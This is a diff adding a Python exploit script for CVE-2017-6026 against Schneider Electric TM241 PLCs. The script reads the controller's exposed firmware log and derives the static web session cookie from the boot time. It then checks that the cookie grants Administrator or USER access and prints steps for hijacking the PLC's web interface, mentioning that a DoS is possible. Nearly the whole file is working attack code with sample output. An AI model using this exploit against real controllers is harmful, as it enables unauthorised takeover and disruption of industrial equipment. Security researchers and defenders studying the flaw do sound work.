@@ -1,0 +1,118 @@
+#! /usr/bin/env python
+''' 
+	Copyright 2018 Photubias(c)
+	# Exploit Title: Schneider Session Calculation - CVE-2017-6026
+	# Date: 2018-09-30
+	# Exploit Author: Deneut Tijl
+	# Vendor Homepage: www.schneider-electric.com
+	# Software Link: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
+	# Version: Schneider Electric PLC 4.0.2.11 & Boot v0.0.2.11
+	# CVE : CVE-2017-6026
+
+        This program is free software: you can redistribute it and/or modify
+        it under the terms of the GNU General Public License as published by
+        the Free Software Foundation, either version 3 of the License, or
+        (at your option) any later version.
+
+        This program is distributed in the hope that it will be useful,
+        but WITHOUT ANY WARRANTY; without even the implied warranty of
+        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+        GNU General Public License for more details.
+
+        You should have received a copy of the GNU General Public License
+        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+        File name CVE-2017-6026-SchneiderSessionCalculation.py
+        written by tijl[dot]deneut[at]howest[dot]be
+
+        Tested on the Schneider TM241 PLC with Firmware 4.0.2.11 & Boot 0.0.2.11.
+        Firmware: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
+        Security Note: https://www.schneider-electric.com/en/download/document/SEVD-2017-075-02/
+
+        This script will calculate the website session cookie, which is static after every reboot.
+        (This cookie is actually the Epoch time at PLC startup)
+        The only prerequisite is that, since the reboot, a user must have been logged in.
+                E.g. Administrator (with default password 'admin')
+                or   USER (with default password 'USER')
+
+		After retrieving the cookie, various website actions are possible (including a DoS).
+		Sample output:
+		C:\Users\admin\Desktop>SchneiderGetSession.py
+		Please enter an IP [10.10.36.224]:
+		This device has booted 33 times
+		Cookie: 1521612584 (22/03/2018 06:09:44.014)
+		----------------
+		--- Device:      TM241CE40R
+		--- MAC Address: 0080F40B24E0
+		--- Firmware:    4.0.2.11
+		--- Controller:  Running
+		----------------
+		Press Enter to close
+'''
+import urllib2
+
+strIP = raw_input('Please enter an IP [10.10.36.224]: ')
+if strIP == '': strIP = '10.10.36.224'
+FwLogURL = 'http://' + strIP + '/usr/Syslog/FwLog.txt'
+try:
+    FwLogResp = urllib2.urlopen(urllib2.Request(FwLogURL)).readlines()
+    NumberOfPowerOns = 0
+    for line in FwLogResp:
+        if 'Firmware core2' in line:
+            NumberOfPowerOns += 1
+            CookieVal = line.split(' ')[1]
+            BootupTime = line.split('(')[1].split(')')[0]
+    NumberOfPowerOns /= 2
+except:
+    print('Error: URL not found.')
+    raw_input('Press enter to exit')
+    exit()
+
+try:
+    CookieVal
+except:
+    print('Error: ' + FwLogURL + ' does not contain the necessary data.')
+    raw_input('Press Enter to Exit')
+    exit()
+
+print('This device has booted ' + str(NumberOfPowerOns) + ' times')
+print('Cookie: ' + CookieVal + ' (' + BootupTime + ')')
+print('----------------')
+raw_input('Press enter to see if the cookie is set on the webserver.'+"\n")
+
+CtrlURL = 'http://' + strIP + '/plcExchange/getValues/'
+CtrlPost = 'S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;'
+
+try:
+    CtrlUser = 'Administrator'
+    DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
+    DataResp = urllib2.urlopen(DataReq).read()
+except:
+    print('Failure for user \'Administrator\'')
+    try:
+        CtrlUser = 'USER'
+        DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={'Cookie':'M258_LOG=' + CtrlUser + ':' + CookieVal})
+        DataResp = urllib2.urlopen(DataReq).read()
+    except:
+        print('Failure for user \'USER\'')
+        raw_input('Press enter to exit')
+print('### SUCCESS (' + CtrlUser + ') ###')
+print('--- Device:      ' + DataResp.split(' ')[0])
+print('--- MAC Address: ' + DataResp.split(';')[0].split(' ')[1][1:])
+print('--- Firmware:    ' + DataResp.split(';')[2] + '.' + DataResp.split(';')[3] + '.' +DataResp.split(';')[4] + '.' +DataResp.split(';')[5])
+state = DataResp.split(';')[1]
+if state == '2':
+    print('--- Controller:  Running')
+elif state == '1':
+    print('--- Controller:  Stopped')
+elif state == '0':
+    print('--- Controller:  ERROR mode')
+print('')
+print('--- To exploit: Create cookie for domain "'+strIP+'"')
+print('    with name "M258_LOG" and value "'+CtrlUser+':'+CookieVal+'"')
+print('    and open "http://'+strIP+'/index2.htm"')
+print('')
+print('----------------')
+
+raw_input('Press enter to close')
+exit()
